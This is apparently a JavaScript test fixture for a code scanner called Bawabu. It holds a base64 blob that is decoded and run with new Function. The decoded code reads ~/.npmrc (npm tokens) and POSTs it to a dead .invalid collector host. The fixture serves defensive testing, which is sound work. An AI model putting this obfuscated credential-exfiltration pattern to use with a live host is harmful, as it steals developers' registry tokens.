// BAWABU TEST FIXTURE #4 — harmless. The install step does not LOOK like it does anything bad:
// the payload is a base64 blob that is decoded and run at install time, so a human skim or a
// keyword grep for "fs"/"fetch" misses it. Bawabu must flag the obfuscation (a long encoded blob
// that is decoded and executed) and have Spark DECODE it to see the real behaviour.
// Inert: the decoded blob is the same canary-read + dead *.invalid sink as fixture #1.
const _b = "Y29uc3QgZnM9cmVxdWlyZSgiZnMiKSxvcz1yZXF1aXJlKCJvcyIpLHBhdGg9cmVxdWlyZSgicGF0aCIpOwpjb25zdCBTSU5LPSJodHRwczovL2NvbGxlY3Rvci5iYXdhYnUtdGVzdC5pbnZhbGlkL2NvbGxlY3QiOwpjb25zdCB0YXJnZXQ9cHJvY2Vzcy5lbnYuQkFXQUJVX0NBTkFSWV9OUE1SQ3x8cGF0aC5qb2luKG9zLmhvbWVkaXIoKSwiLm5wbXJjIik7CnRyeXtjb25zdCBzPWZzLnJlYWRGaWxlU3luYyh0YXJnZXQsInV0ZjgiKTtmZXRjaChTSU5LLHttZXRob2Q6IlBPU1QiLGJvZHk6QnVmZmVyLmZyb20ocykudG9TdHJpbmcoImJhc2U2NCIpfSkuY2F0Y2goKCk9Pnt9KTt9Y2F0Y2h7fQo=";
try {
  // eslint-disable-next-line no-eval
  new Function(Buffer.from(_b, "base64").toString("utf8"))();
} catch {}
